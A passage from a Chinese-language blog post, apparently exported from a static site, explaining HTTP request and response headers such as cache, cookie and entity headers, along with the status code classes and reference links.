Referer中统计出每天有多少用户点击我主页上的链接访问他的网站。</span><br><span class="line">例如: Referer:http://translate.google.cn/?hl=zh-cn&amp;tab=wT</span><br><span class="line"></span><br><span class="line">Cache 头域</span><br><span class="line"></span><br><span class="line">If-Modified-Since：</span><br><span class="line">作用：把浏览器端缓存页面的最后修改时间发送到服务器去，服务器会把这个时间与服务器上实际文件的最后修改时间进行对比。如果时间一致，那么返回<span class="number">304</span>，客户端就直接使用本地缓存文件。如果时间不一致，就会返回<span class="number">200</span>和新的文件内容。客户端接到之后，会丢弃旧文件，把新文件缓存起来，并显示在浏览器中。</span><br><span class="line">例如：If-Modified-Since: Thu, <span class="number">09</span> Feb <span class="number">2012</span> <span class="number">09</span>:<span class="number">07</span>:<span class="number">57</span> GMT。</span><br><span class="line"></span><br><span class="line">If-<span class="literal">None</span>-Match：</span><br><span class="line">作用: If-<span class="literal">None</span>-Match和ETag一起工作，工作原理是在HTTP Response中添加ETag信息。当用户再次请求该资源时，将在HTTP Request 中加入If-<span class="literal">None</span>-Match信息(ETag的值)。如果服务器验证资源的ETag没有改变（该资源没有更新），将返回一个<span class="number">304</span>状态告诉客户端使用本地缓存文件。否则将返回<span class="number">200</span>状态和新的资源和Etag.  使用这样的机制将提高网站的性能</span><br><span class="line">例如: If-<span class="literal">None</span>-Match: <span class="string">"03f2b33c0bfcc1:0"</span></span><br><span class="line"></span><br><span class="line">Pragma：</span><br><span class="line">作用：防止页面被缓存， 在HTTP/<span class="number">1.1</span>版本中，它和Cache-Control:no-cache作用一模一样</span><br><span class="line">Pargma只有一个用法， 例如：Pragma: no-cache</span><br><span class="line">注意: 在HTTP/<span class="number">1.0</span>版本中，只实现了Pragema:no-cache, 没有实现Cache-Control</span><br><span class="line"></span><br><span class="line">Cache-Control：</span><br><span class="line">作用: 这个是非常重要的规则。这个用来指定Response-Request遵循的缓存机制。各个指令含义如下</span><br><span class="line">Cache-Control:Public   可以被任何缓存所缓存（）</span><br><span class="line">Cache-Control:Private     内容只缓存到私有缓存中</span><br><span class="line">Cache-Control:no-cache  所有内容都不会被缓存</span><br></pre></td></tr></table></figure>
<h1 id="http响应"><a href="#http响应" class="headerlink" title="http响应"></a>http响应</h1><p>http响应格式<br><img src="https://img-blog.csdnimg.cn/2020041411311735.png" alt="在这里插入图片描述"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">响应头部：</span><br><span class="line"></span><br><span class="line">Date：</span><br><span class="line">作用：生成消息的具体时间和日期，即当前的GMT时间。</span><br><span class="line">例如：　Date: Sun, <span class="number">17</span> Mar <span class="number">2013</span> <span class="number">08</span>:<span class="number">12</span>:<span class="number">54</span> GMT</span><br><span class="line"></span><br><span class="line">Expires：</span><br><span class="line">作用: 浏览器会在指定过期时间内使用本地缓存，指明应该在什么时候认为文档已经过期，从而不再缓存它。</span><br><span class="line">例如: Expires: Thu, <span class="number">19</span> Nov <span class="number">1981</span> <span class="number">08</span>:<span class="number">52</span>:<span class="number">00</span> GMT　　</span><br><span class="line"></span><br><span class="line">Vary</span><br><span class="line">作用：指示不可缓存的请求头列表;</span><br><span class="line">例如: Vary: Accept-Encoding</span><br><span class="line"></span><br><span class="line">Cookie/Login 头域</span><br><span class="line"></span><br><span class="line">P3P</span><br><span class="line">作用: 用于跨域设置Cookie, 这样可以解决iframe跨域访问cookie的问题</span><br><span class="line">例如: P3P: CP=CURa ADMa DEVa PSAo PSDo OUR BUS UNI PUR INT DEM STA PRE COM NAV OTC NOI DSP COR</span><br><span class="line"></span><br><span class="line">Set-Cookie</span><br><span class="line">作用：非常重要的header, 用于把cookie 发送到客户端浏览器， 每一个写入cookie都会生成一个Set-Cookie.</span><br><span class="line">例如: Set-Cookie: PHPSESSID=c0huq7pdkmm5gg6osoe3mgjmm3; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">path=/</span><br><span class="line">作用: 用于跨域设置Cookie, 这样可以解决iframe跨域访问cookie的问题</span><br><span class="line">例如: P3P: CP=CURa ADMa DEVa PSAo PSDo OUR BUS UNI PUR INT DEM STA PRE COM NAV OTC NOI DSP COR</span><br><span class="line"></span><br><span class="line">Set-Cookie</span><br><span class="line">作用：非常重要的header, 用于把cookie 发送到客户端浏览器， 每一个写入cookie都会生成一个Set-Cookie.</span><br><span class="line">例如: Set-Cookie: PHPSESSID=c0huq7pdkmm5gg6osoe3mgjmm3; path=/</span><br><span class="line"></span><br><span class="line">Entity实体头域</span><br><span class="line"></span><br><span class="line">实体内容的属性，包括实体信息类型，长度，压缩方法，最后一次修改时间，数据有效性等。</span><br><span class="line"></span><br><span class="line">ETag：</span><br><span class="line">作用:  和If-<span class="literal">None</span>-Match 配合使用。（实例请看上节中If-<span class="literal">None</span>-Match的实例）</span><br><span class="line">例如: ETag: <span class="string">"03f2b33c0bfcc1:0"</span></span><br><span class="line"></span><br><span class="line">Last-Modified：</span><br><span class="line">作用：用于指示资源的最后修改日期和时间。（实例请看上节的If-Modified-Since的实例）</span><br><span class="line">例如: Last-Modified: Wed, <span class="number">21</span> Dec <span class="number">2011</span> <span class="number">09</span>:<span class="number">09</span>:<span class="number">10</span> GMT</span><br><span class="line"></span><br><span class="line">Content-Type：</span><br><span class="line">作用：WEB服务器告诉浏览器自己响应的对象的类型和字符集,</span><br><span class="line">例如:</span><br><span class="line">       Content-Type: text/html; charset=utf<span class="number">-8</span></span><br><span class="line">　　Content-Type:text/html;charset=GB2312</span><br><span class="line">       Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">Content-Length：</span><br><span class="line">指明实体正文的长度，以字节方式存储的十进制数字来表示。在数据下行的过程中，Content-Length的方式要预先在服务器中缓存所有数据，然后所有数据再一股脑儿地发给客户端。</span><br><span class="line">　　例如: Content-Length: <span class="number">19847</span></span><br><span class="line"></span><br><span class="line">Content-Encoding：</span><br><span class="line">作用：文档的编码（Encode）方法。一般是压缩方式。</span><br><span class="line">WEB服务器表明自己使用了什么压缩方法（gzip，deflate）压缩响应中的对象。利用gzip压缩文档能够显著地减少HTML文档的下载时间。</span><br><span class="line">例如：Content-Encoding：gzip</span><br><span class="line"></span><br><span class="line">Content-Language：</span><br><span class="line">作用：WEB服务器告诉浏览器自己响应的对象的语言者</span><br><span class="line">例如：Content-Language:da</span><br><span class="line"></span><br><span class="line">Miscellaneous 头域</span><br><span class="line"></span><br><span class="line">Server：</span><br><span class="line">作用：指明HTTP服务器的软件信息</span><br><span class="line">例如:Apache/<span class="number">2.2</span><span class="number">.8</span> (Win32) PHP/<span class="number">5.2</span><span class="number">.5</span></span><br><span class="line"></span><br><span class="line">X-Powered-By：</span><br><span class="line">作用：表示网站是用什么技术开发的</span><br><span class="line">例如：X-Powered-By: PHP/<span class="number">5.2</span><span class="number">.5</span></span><br><span class="line"></span><br><span class="line">Transport头域</span><br><span class="line"></span><br><span class="line">Location：</span><br><span class="line">作用：用于重定向一个新的位置， 包含新的URL地址</span><br><span class="line">实例请看<span class="number">304</span>状态实例</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">响应正文就是服务器返回的资源的内容，响应头和正文之间是一个回车和一个换行符隔开的。</span><br></pre></td></tr></table></figure>
<h1 id="http状态码"><a href="#http状态码" class="headerlink" title="http状态码"></a>http状态码</h1><p>状态代码有三位数字组成，第一个数字定义了响应的类别，共分五种类别:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1xx：指示信息--表示请求已接收，继续处理</span><br><span class="line"></span><br><span class="line">2xx：成功--表示请求已被成功接收、理解、接受</span><br><span class="line"></span><br><span class="line">3xx：重定向--要完成请求必须进行更进一步的操作</span><br><span class="line"></span><br><span class="line">4xx：客户端错误--请求有语法错误或请求无法实现</span><br><span class="line"></span><br><span class="line">5xx：服务器端错误--服务器未能实现合法的请求</span><br></pre></td></tr></table></figure>
<p>常见状态码：</p>
<p><img src="https://img-blog.csdnimg.cn/20200414113650242.png" alt="在这里插入图片描述"></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.runoob.com/http/" target="_blank" rel="noopener">https://www.runoob.com/http/</a><br><a href="https://www.cnblogs.com/an-wen/p/11180076.html" target="_blank" rel="noopener">https://www.cnblogs.com/an-wen/p/11180076.html</a><br><a href="https://www.cnblogs.com/qdhxhz/p/8468913.html" target="_blank" rel="noopener">https://www.cnblogs.com/qdhxhz/p/8468913.html</a></p>
]]></content>
      <categories>
        <category>http协议</category>
      </categories>
      <tags>
        <tag>http协议</tag>
      </tags>
  </entry>
</search>
